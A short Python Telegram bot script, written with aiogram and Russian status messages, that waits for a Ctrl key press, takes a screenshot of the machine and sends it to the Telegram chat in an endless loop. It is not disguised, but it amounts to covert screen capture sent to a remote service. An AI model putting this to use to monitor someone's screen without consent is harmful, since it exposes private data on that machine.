from aiogram import Bot
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram import types
import config
import keyboard
import prntScr
from time import sleep

bot = Bot(config.TOKEN)
dp = Dispatcher(bot)

async def on_startup(_):
    print('Бот вышел в онлайн')


@dp.message_handler(commands='start')
async def start(message: types.Message):
    chat_id = message.chat.id
    await message.answer("Начало работы")
    print(chat_id)
    while True:
        keyboard.wait("ctrl")
        img = prntScr.take_screenshot()
        await message.answer_photo(img)


executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
